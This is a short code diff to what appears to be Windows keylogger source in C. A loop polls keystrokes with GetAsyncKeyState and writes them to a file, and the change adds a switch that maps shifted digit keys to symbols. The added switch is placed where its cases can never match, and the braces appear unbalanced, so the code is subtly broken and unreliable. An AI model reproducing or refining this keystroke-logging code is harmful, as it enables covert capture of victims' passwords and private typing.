@@ -14,13 +14,24 @@ while(1){
         if(file){
         if(key>=65 && key<=90){
           if (GetAsyncKeyState(VK_SHIFT)){
-            fprintf(file,"%c" , key);
-        }else{
-          fprintf(file,"%c",key + 32);
+            switch(key) {
+            case 48: fprintf(file, ")"); break;  
+            case 49: fprintf(file, "!"); break; 
+            case 50: fprintf(file, "@"); break; 
+            case 51: fprintf(file, "#"); break; 
+            case 52: fprintf(file, "$"); break; 
+            case 53: fprintf(file, "%%"); break; 
+            case 54: fprintf(file, "^"); break; 
+            case 55: fprintf(file, "&"); break; 
+            case 56: fprintf(file, "*"); break; 
+            case 57: fprintf(file, "("); break; 
         }
-      }
+    } else {
+        fprintf(file, "%c", key); 
+    }
+}
       else if(key>=48 && key <=57) {
-        fprintf(file,"%c",key);
+        fprintf(file,"%c",key); 
       }
         else{
           switch (key){
